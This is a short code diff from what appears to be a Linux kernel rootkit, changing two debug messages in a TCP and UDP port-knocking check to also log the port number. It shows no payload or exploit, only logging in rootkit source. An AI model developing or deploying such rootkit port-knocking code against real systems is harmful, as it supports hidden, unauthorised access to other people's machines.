@@ -54,7 +54,7 @@ is_port_blocked (struct sk_buff *skb) {
 				tcp_state = 0;
 			}
 			
-			ROOTKIT_DEBUG("TCP port knocking state is now %u.\n", tcp_state);
+			ROOTKIT_DEBUG("Packet detected on TCP Port %u. State is now %u.\n", port, tcp_state);
 		}
 		
 		/* check if the port matches */
@@ -95,7 +95,7 @@ is_port_blocked (struct sk_buff *skb) {
 				udp_state = 0;
 			}
 			
-			ROOTKIT_DEBUG("UDP port knocking state is now %u.\n", udp_state);
+			ROOTKIT_DEBUG("Packet detected on UDP Port %u. State is now %u.\n", port, udp_state);
 		}
 
 		/* check if the port matches */
